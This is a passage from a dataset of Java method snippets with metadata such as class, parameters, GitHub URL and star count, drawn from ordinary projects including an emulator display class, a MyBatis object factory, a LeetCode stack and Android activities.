i.totaisTitulos++;\n            }\n\n            line = file.readLine();\n\n        }\n        \n        Set<Map.Entry<String, Info>> set = map.entrySet();\n        \n        set.forEach((result) -> {\n            System.out.println(\"Plataforma \" + result.getKey() + \" | Porcentagem Great Reviews \" + ((result.getValue().totaisGreat*100)/result.getValue().totaisTitulos)+\"%\");\n        });\n    }", "url": "https://raw.githubusercontent.com/gustavost645/tarefa_reviews/master/src/main/java/br/univates/GeradorLista/GreatReviews.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55713, "method_name": "setPropertyOfDisplayType", "class_name": "AbstractDisplay", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPropertyOfDisplayType(int type) {\n        String s;\n        switch (type) {\n        case DISPLAYTYPE_MONOCHROME:\n            s = \"monochrome\";\n            break;\n        case DISPLAYTYPE_GREEN:\n            s = \"green\";\n            break;\n        case DISPLAYTYPE_AMBER:\n            s = \"amber\";\n            break;\n        case DISPLAYTYPE_COLOR:\n            s = \"color\";\n            break;\n        default:\n            s = \"monochrome\";\n            break;\n        }\n        Application.getProperties().setProperty(PROPERTY_DISPLAY_TYPE, s);\n        initializeColors();\n        initializeFonts();\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55714, "method_name": "getPropertyOfDisplayType", "class_name": "AbstractDisplay", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPropertyOfDisplayType() {\n        Properties p = Application.getProperties();\n        String m = p.getProperty(PROPERTY_DISPLAY_TYPE);\n        String m_compat = p.getProperty(PROPERTY_DISPLAY_COLOR);\n\n        // \u65b0\u3057\u3044\u30d7\u30ed\u30d1\u30c6\u30a3\u6587\u5b57\u5217\u306b\u5909\u63db\u3059\u308b\u3002\n        if (m_compat != null) {\n            p.setProperty(PROPERTY_DISPLAY_TYPE, m_compat);\n            p.remove(PROPERTY_DISPLAY_COLOR);\n            m = m_compat;\n        }\n        if (m == null) {\n            return DISPLAYTYPE_MONOCHROME;\n        }\n        else {\n            if (m.equals(\"monochrome\")) {\n                return DISPLAYTYPE_MONOCHROME;\n            }\n            else if (m.equals(\"green\")) {\n                return DISPLAYTYPE_GREEN;\n            }\n            else if (m.equals(\"amber\") || m.equals(\"orange\")) {\n                return DISPLAYTYPE_AMBER;\n            }\n            else if (m.equals(\"color\")){\n                return DISPLAYTYPE_COLOR;\n            }\n            else {\n                return DISPLAYTYPE_MONOCHROME;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55715, "method_name": "setDisplayColorMap", "class_name": "AbstractDisplay", "params": ["int", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDisplayColorMap(int kind, String file) {\n        if (kind == COLORMAP_DEFAULT) {\n            Application.getProperties().setProperty(PROPERTY_DISPLAY_COLORMAP, \"default\");\n        }\n        else if (kind == COLORMAP_FILE) {\n            if (file == null || file.length() == 0) {\n                throw new IllegalArgumentException(\"\u30d5\u30a1\u30a4\u30eb\u304c\u6307\u5b9a\u3055\u308c\u3066\u3044\u306a\u3044\u304b\u30d5\u30a1\u30a4\u30eb\u540d\u9577\u304c\u30bc\u30ed\u3067\u3059\u3002\");\n            }\n            readColorMapFile(file);\n            Application.getProperties().setProperty(PROPERTY_DISPLAY_COLORMAP, \"file \" + file);\n        }\n        applyDisplayColor();\n        initializeFonts();\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55716, "method_name": "getPropertyOfDisplayColorMap", "class_name": "AbstractDisplay", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPropertyOfDisplayColorMap() {\n        String m = Application.getProperties().getProperty(PROPERTY_DISPLAY_COLORMAP, \"default\");\n        if (m.matches(\"^default\\\\s.*$\")) {\n            return COLORMAP_DEFAULT;\n        }\n        else if (m.matches(\"^file\\\\s.*$\")) {\n            return COLORMAP_FILE;\n        }\n        else {\n            return COLORMAP_DEFAULT;\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55717, "method_name": "getPropertyOfDisplayColorMapFile", "class_name": "AbstractDisplay", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPropertyOfDisplayColorMapFile() {\n        String m = Application.getProperties().getProperty(PROPERTY_DISPLAY_COLORMAP);\n        if (m == null) {\n            return null;\n        }\n        else {\n            if (m.matches(\"^default\\\\s.*$\")) {\n                return null;\n            }\n            else if (m.matches(\"^file\\\\s.*$\")) {\n                return m.replaceFirst(\"^file\\\\s*\", \"\");\n            }\n            else {\n                return null;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55718, "method_name": "getPropertyOfDisplayScaling", "class_name": "AbstractDisplay", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPropertyOfDisplayScaling() {\n        String m = Application.getProperties().getProperty(PROPERTY_DISPLAY_SCALING, \"1\");\n        int value;\n        try {\n            value = Integer.parseInt(m);\n        }\n        catch (NumberFormatException e) {\n            value = 1;\n        }\n        return value;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55719, "method_name": "setPropertyOfDisplayScaling", "class_name": "AbstractDisplay", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPropertyOfDisplayScaling(int scaling) {\n        this.scaling = scaling;\n        computer.getApplication().pack();\n        Application.getProperties().setProperty(PROPERTY_DISPLAY_SCALING, Integer.toString(scaling));\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55720, "method_name": "readColorMapFile", "class_name": "AbstractDisplay", "params": ["String"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "boolean", "snippet": "    protected abstract boolean readColorMapFile(String filename);\n\n    protected abstract void applyDisplayColor();\n\n    protected abstract void initializeColors();\n\n    protected abstract void initializeFonts();\n\n    protected abstract void renderDisplay(Graphics g);\n\n    public void refresh() {\n        SwingUtilities.invokeLater(refresher);\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55721, "method_name": "applyDisplayColor", "class_name": "AbstractDisplay", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void applyDisplayColor();\n\n    protected abstract void initializeColors();\n\n    protected abstract void initializeFonts();\n\n    protected abstract void renderDisplay(Graphics g);\n\n    public void refresh() {\n        SwingUtilities.invokeLater(refresher);\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55722, "method_name": "initializeColors", "class_name": "AbstractDisplay", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void initializeColors();\n\n    protected abstract void initializeFonts();\n\n    protected abstract void renderDisplay(Graphics g);\n\n    public void refresh() {\n        SwingUtilities.invokeLater(refresher);\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55723, "method_name": "initializeFonts", "class_name": "AbstractDisplay", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void initializeFonts();\n\n    protected abstract void renderDisplay(Graphics g);\n\n    public void refresh() {\n        SwingUtilities.invokeLater(refresher);\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55724, "method_name": "renderDisplay", "class_name": "AbstractDisplay", "params": ["Graphics"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void renderDisplay(Graphics g);\n\n    public void refresh() {\n        SwingUtilities.invokeLater(refresher);\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55725, "method_name": "refresh", "class_name": "AbstractDisplay", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void refresh() {\n        SwingUtilities.invokeLater(refresher);\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55726, "method_name": "paintComponent", "class_name": "AbstractDisplay", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void paintComponent(Graphics g) {\n        super.paintComponent(g);\n        g.setColor(Color.gray);\n        g.fillRect(0, 0, width * scaling, height * scaling);\n        if (computer.getRunningStatus() == Computer.STATUS_RUNNING || computer.getRunningStatus() == Computer.STATUS_PAUSED) {\n            renderDisplay(g);\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55727, "method_name": "execute", "class_name": "AbstractDisplay", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute() {\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55728, "method_name": "reset", "class_name": "AbstractDisplay", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reset() {\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55729, "method_name": "loadState", "class_name": "AbstractDisplay", "params": ["StateSet"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loadState(StateSet ss) {\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55730, "method_name": "saveState", "class_name": "AbstractDisplay", "params": ["StateSet"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void saveState(StateSet ss) {\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": "JComponent", "implements": ["Device", "StateSavable"], "modifiers": ["public", "abstract"]}}, {"id": 55731, "method_name": "run", "class_name": "Refresher", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void run() {\n            paintImmediately(0, 0, width * scaling, height * scaling);\n        }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/AbstractDisplay.java", "stars": "4", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["private"]}}, {"id": 55732, "method_name": "create", "class_name": "DefaultObjectFactory", "params": ["Class<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T create(Class<T> type) {\n    return create(type, null, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/factory/DefaultObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory", "Serializable"], "modifiers": ["public"]}}, {"id": 55733, "method_name": "create", "class_name": "DefaultObjectFactory", "params": ["Class<T>", "List<Class>", "List<Object>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T create(Class<T> type, List<Class<?>> constructorArgTypes, List<Object> constructorArgs) {\n    Class<?> classToCreate = resolveInterface(type);\n    // we know types are assignable\n    return (T) instantiateClass(classToCreate, constructorArgTypes, constructorArgs);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/factory/DefaultObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory", "Serializable"], "modifiers": ["public"]}}, {"id": 55734, "method_name": "instantiateClass", "class_name": "DefaultObjectFactory", "params": ["Class<T>", "List<Class>", "List<Object>"], "throws": null, "modifiers": ["private"], "return_type": "T", "snippet": "  private  <T> T instantiateClass(Class<T> type, List<Class<?>> constructorArgTypes, List<Object> constructorArgs) {\n    try {\n      Constructor<T> constructor;\n      if (constructorArgTypes == null || constructorArgs == null) {\n        constructor = type.getDeclaredConstructor();\n        try {\n          return constructor.newInstance();\n        } catch (IllegalAccessException e) {\n          if (Reflector.canControlMemberAccessible()) {\n            constructor.setAccessible(true);\n            return constructor.newInstance();\n          } else {\n            throw e;\n          }\n        }\n      }\n      constructor = type.getDeclaredConstructor(constructorArgTypes.toArray(new Class[0]));\n      try {\n        return constructor.newInstance(constructorArgs.toArray(new Object[0]));\n      } catch (IllegalAccessException e) {\n        if (Reflector.canControlMemberAccessible()) {\n          constructor.setAccessible(true);\n          return constructor.newInstance(constructorArgs.toArray(new Object[0]));\n        } else {\n          throw e;\n        }\n      }\n    } catch (Exception e) {\n      String argTypes = Optional.ofNullable(constructorArgTypes).orElseGet(Collections::emptyList)\n          .stream().map(Class::getSimpleName).collect(Collectors.joining(\",\"));\n      String argValues = Optional.ofNullable(constructorArgs).orElseGet(Collections::emptyList)\n          .stream().map(String::valueOf).collect(Collectors.joining(\",\"));\n      throw new ReflectionException(\"Error instantiating \" + type + \" with invalid types (\" + argTypes + \") or values (\" + argValues + \"). Cause: \" + e, e);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/factory/DefaultObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory", "Serializable"], "modifiers": ["public"]}}, {"id": 55735, "method_name": "resolveInterface", "class_name": "DefaultObjectFactory", "params": ["Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "Class<?>", "snippet": "  protected Class<?> resolveInterface(Class<?> type) {\n    Class<?> classToCreate;\n    if (type == List.class || type == Collection.class || type == Iterable.class) {\n      classToCreate = ArrayList.class;\n    } else if (type == Map.class) {\n      classToCreate = HashMap.class;\n    } else if (type == SortedSet.class) { // issue #510 Collections Support\n      classToCreate = TreeSet.class;\n    } else if (type == Set.class) {\n      classToCreate = HashSet.class;\n    } else {\n      classToCreate = type;\n    }\n    return classToCreate;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/factory/DefaultObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory", "Serializable"], "modifiers": ["public"]}}, {"id": 55736, "method_name": "isCollection", "class_name": "DefaultObjectFactory", "params": ["Class<T>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public <T> boolean isCollection(Class<T> type) {\n    return Collection.class.isAssignableFrom(type);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/factory/DefaultObjectFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectFactory", "Serializable"], "modifiers": ["public"]}}, {"id": 55737, "method_name": "push", "class_name": "MinStack", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void push(int x) {\n        if (head == null) {\n            head = new Node(x);\n            head.min = x;\n        } else {\n            Node newNode = new Node(x);\n            newNode.next = head;\n            head = newNode;\n            head.min = Math.min(x, newNode.next.min);\n        }\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/MinStack.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55738, "method_name": "pop", "class_name": "MinStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pop() {\n        head = head.next;\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/MinStack.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55739, "method_name": "top", "class_name": "MinStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int top() {\n        return head.val;\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/MinStack.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55740, "method_name": "getMin", "class_name": "MinStack", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMin() {\n        return head.min;\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/MinStack.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55741, "method_name": "next", "class_name": "CharReader", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "char", "snippet": "    public char next() throws IOException {\n        if (!hasNext()) {\n            return EOF;\n        }\n\n        return buffer[++pos];\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/CharReader.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55742, "method_name": "hasNext", "class_name": "CharReader", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasNext() throws IOException {\n        if (pos < size - 1) {\n            return true;\n        }\n\n        // \u586b\u5145\u7f13\u51b2\u6c60\n        int n = reader.read(buffer);\n        if (n == -1) return false;\n\n        // \u6307\u9488\u590d\u4f4d\u3001\u5927\u5c0f\u91cd\u7f6e\n        pos  = -1;\n        size = n;\n\n        return pos < size - 1;\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/CharReader.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55743, "method_name": "peek", "class_name": "CharReader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "char", "snippet": "    public char peek() {\n        if (pos >= size) {\n            return EOF;\n        }\n\n        return buffer[Math.max(0, pos)];\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/CharReader.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55744, "method_name": "skipWhite", "class_name": "CharReader", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void skipWhite() throws IOException {\n        char c = next();\n\n        while (Character.isWhitespace(c)) {\n            c = next();\n        }\n\n        if (c != EOF) back();\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/CharReader.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55745, "method_name": "back", "class_name": "CharReader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void back() {\n        pos = Math.max(--pos, -1); // pos\u81f3\u5c11\u4e3a-1\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/CharReader.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55746, "method_name": "matchNextAndSkip", "class_name": "CharReader", "params": ["String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean matchNextAndSkip(@NotNull String match) throws IOException {\n\n        for (int i = 0, size = match.length(); i < size; i++) {\n            if (!hasNext()) return false;\n\n            char c = next();\n            char m = match.charAt(i);\n            if (c != m) {\n                return false;\n            }\n        }\n\n        return true;\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/CharReader.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55747, "method_name": "onCreate", "class_name": "splash_activity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        getSupportActionBar().hide();\n        setContentView(R.layout.activity_splash_activity);\n        new Handler().postDelayed(new Runnable() {\n            @Override\n            public void run() {\n                Intent intent=new Intent(splash_activity.this,MainActivity.class);\n                startActivity(intent);\n                finish();\n            }\n        },2000);\n    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/splash_activity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 55748, "method_name": "parseObj", "class_name": "JSONTool", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "JSONObject", "snippet": "    public static JSONObject parseObj(String str) {\n        return JSONObject.parseObject(str);\n    }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/tools/JSONTool.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55749, "method_name": "parseArray", "class_name": "JSONTool", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "JSONArray", "snippet": "    public static JSONArray parseArray(String str) {\n        return JSONArray.parseArray(str);\n    }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/tools/JSONTool.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55750, "method_name": "readValue", "class_name": "ObjectUtil", "params": ["String", "Class<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T readValue(String json, Class<T> valueType) {\n        try {\n            return objectMapper.readValue(json, valueType);\n        } catch (IOException e) {\n            log.error(String.format(\"parse json:%s to class:%s error:%s\", json, valueType.getName(), e.getMessage()));\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/jiangvin/webtank/master/util/src/main/java/com/integration/util/object/ObjectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55751, "method_name": "readValue", "class_name": "ObjectUtil", "params": ["Map", "Class<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T readValue(Map map, Class<T> valueType) {\n        try {\n            return objectMapper.readValue(objectMapper.writeValueAsString(map), valueType);\n        } catch (IOException e) {\n            log.error(String.format(\"parse map:%s to class:%s error:%s\", map.toString(), valueType.getName(), e.getMessage()));\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/jiangvin/webtank/master/util/src/main/java/com/integration/util/object/ObjectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55752, "method_name": "readValue", "class_name": "ObjectUtil", "params": ["Object", "Class<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T readValue(Object object, Class<T> valueType) {\n        if (object == null) {\n            return null;\n        }\n\n        if (object instanceof Map) {\n            return readValue((Map)object, valueType);\n        } else if (object instanceof String) {\n            return readValue((String) object, valueType);\n        } else {\n            return readValue(object.toString(), valueType);\n        }\n    }", "url": "https://raw.githubusercontent.com/jiangvin/webtank/master/util/src/main/java/com/integration/util/object/ObjectUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55753, "method_name": "onCreate", "class_name": "EditMarket", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n\n        setContentView(R.layout.activity_fragment_container);\n\n\n        if(getSupportFragmentManager().findFragmentByTag(TAG_FRAGMENT_EDIT)==null)\n        {\n            getSupportFragmentManager()\n                    .beginTransaction()\n                    .add(R.id.fragment_container,new EditMarketFragment(),TAG_FRAGMENT_EDIT)\n                    .commit();\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/EditDataScreens/EditMarket/EditMarket.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 55754, "method_name": "onBackPressed", "class_name": "EditMarket", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBackPressed() {\n        super.onBackPressed();\n//        overridePendingTransition(R.anim.enter_from_left,R.anim.exit_to_right);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/EditDataScreens/EditMarket/EditMarket.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 55755, "method_name": "TestItWorks", "class_name": "MealsTest", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void TestItWorks() throws IOException {\n        String result = Meals.mealify(\"\ud83d\udc1f\ud83c\udf5a\");\n        Assert.assertEquals(result,\"\ud83c\udf63\");\n    }", "url": "https://raw.githubusercontent.com/EmojiMeals/meals-java/master/src/test/java/MealsTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55756, "method_name": "TestItWorksTheOtherWayAround", "class_name": "MealsTest", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void TestItWorksTheOtherWayAround() throws IOException {\n        String result = Meals.mealify(\"\ud83c\udf5a\ud83d\udc1f\");\n        Assert.assertEquals(result,\"\ud83c\udf63\");\n    }", "url": "https://raw.githubusercontent.com/EmojiMeals/meals-java/master/src/test/java/MealsTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55757, "method_name": "show", "class_name": "DataSourceAdminController", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "Response<DataSource>", "snippet": "    public Response<DataSource> show(@PathVariable(\"id\")Long id){\n        DataSource dataSource = dataSourceService.getDetail(id);\n        return new Response<DataSource>().successResponse(dataSource);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceAdminController.java", "stars": "23", "class_props": {"extends": "ExceptionResolverContext", "implements": null, "modifiers": ["public"]}}, {"id": 55758, "method_name": "convert", "class_name": "CustomGsonRequestBodyConverter", "params": ["T"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "RequestBody", "snippet": "    public RequestBody convert(T value) throws IOException {\n        Buffer buffer = new Buffer();\n        Writer writer = new OutputStreamWriter(buffer.outputStream(), UTF_8);\n        JsonWriter jsonWriter = gson.newJsonWriter(writer);\n        adapter.write(jsonWriter, value);\n        jsonWriter.close();\n        return RequestBody.create(MEDIA_TYPE, buffer.readByteString());\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_network/src/main/java/com/hl/lib_network/convert/CustomGsonRequestBodyConverter.java", "stars": "14", "class_props": {"extends": null, "implements": ["Converter"], "modifiers": ["final"]}}, {"id": 55759, "method_name": "fileReader", "class_name": "SampleIntegrationApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "FileReadingMessageSource", "snippet": "\tpublic FileReadingMessageSource fileReader() {\n\t\tFileReadingMessageSource reader = new FileReadingMessageSource();\n\t\treader.setDirectory(this.serviceProperties.getInputDir());\n\t\treturn reader;\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-integration/src/main/java/smoketest/integration/SampleIntegrationApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55760, "method_name": "inputChannel", "class_name": "SampleIntegrationApplication", "params": [], "throws": 